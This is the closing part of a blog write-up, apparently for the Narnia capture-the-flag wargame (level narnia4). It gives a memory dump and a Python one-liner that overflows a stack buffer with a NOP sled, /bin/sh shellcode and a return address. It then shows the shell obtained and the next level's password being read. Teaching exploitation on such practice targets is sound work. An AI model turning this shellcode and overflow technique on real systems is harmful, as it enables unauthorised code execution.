<span class="hllgo">0xffffd890:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd8a0:     0x61616161      0x61616161      0x61616161      0x61616161</span>
<span class="hllgo">0xffffd8b0:     0x61616161      0x62626261      0x00000062      0x00000000</span>
<span class="hllgo">0xffffd8c0:     0x00000000      0x00000000      0x00000000      0x00000000</span>
<span class="hllgo">0xffffd8d0:     0x00000000      0x00000000      0x00000000      0x00000000</span>
</pre></div>
<p>Our input starts at around <em>0xffffd7a8</em> so let's get going writing our payload.
Create a nopsled that is <em>272 - 25</em> bytes long, follow that with the
the same shellcode as before, and finish with an address that sits comfortably
in the sled. You normally need to play with the address a bit, as the offsets
inside <em>gdb</em> are a bit different.</p>
<div class="highlight"><pre><span></span><span class="hllgp">narnia4@melinda:/narnia$</span> ./narnia4 <span class="hllsb">`</span>python -c <span class="hlls2">&quot;print &#39;\x90&#39;*(272-25) + &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&#39; + &#39;\x30\xd8\xff\xff&#39;&quot;</span><span class="hllsb">`</span>
<span class="hllgp">$</span> whoami
<span class="hllgo">narnia5</span>
<span class="hllgp">$</span> cat /etc/narnia_pass/narnia5
<span class="hllgo">[password]</span>
</pre></div>
</div>

		</div> <!--/#entry-content-->
	</div> <!--/#main-->
</div>  <!--/#post-->
	<div id="comments">
		<div id="respond">
			<div id="disqus_thread"></div>
	        <script type="text/javascript">
	            var disqus_shortname = 'unlogic';
	
	            /* * * DON'T EDIT BELOW THIS LINE * * */
	            (function() {
	                var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
	                dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
	                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
	            })();
	        </script>
	        <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
	        <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
		</div><!-- #respond -->					
</div><!-- #comments -->

		</div>
		
		<div id="footer">
			<p>Powered by <a href="http://getpelican.com">Pelican</a>, theme by <a href="http://bunnyman.info">tBunnyMan</a>.</p>
<script type="text/javascript">
    var disqus_shortname = 'unlogic';
    (function () {
        var s = document.createElement('script'); s.async = true;
        s.type = 'text/javascript';
        s.src = 'http://' + disqus_shortname + '.disqus.com/count.js';
        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
</script>		</div><!-- /#footer -->
	</div><!-- /#container -->
	<div style="display:none"></div>
</body>
</html>